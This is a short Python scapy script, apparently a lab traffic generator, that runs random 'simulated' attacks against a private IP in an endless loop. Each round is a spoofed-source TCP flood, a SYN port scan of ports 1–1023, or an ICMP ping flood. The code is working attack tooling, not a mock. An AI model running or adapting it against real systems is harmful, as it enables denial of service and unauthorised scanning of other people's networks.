import random
from scapy.all import IP, TCP, send, ICMP
from time import sleep

def simulate_attack(target_ip):
    attack_type = random.choice(['ddos', 'port_scan', 'ping_flood'])

    if attack_type == 'ddos':
        print("Simulating DDoS attack")
        for _ in range(100):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    elif attack_type == 'port_scan':
        print("Simulating Port Scan")
        for port in range(1, 1024):  # Élargit le scan à un plus grand nombre de ports
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")  # Utilisation du drapeau SYN pour un scan SYN
            send(packet, verbose=0)

    elif attack_type == 'ping_flood':
        print("Simulating Ping Flood")
        for _ in range(1000):  # Augmente le nombre de pings pour simuler un flood
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)

# Adresse IP cible pour la simulation
target_ip = "192.168.1.10"

# Simule une attaque à intervalles aléatoires plus courts
while True:
    simulate_attack(target_ip)
    sleep_time = random.randint(10, 60)  # Réduction de l'attente à entre 10 secondes et 1 minute
    print(f"Waiting {sleep_time} seconds before next attack")
    sleep(sleep_time)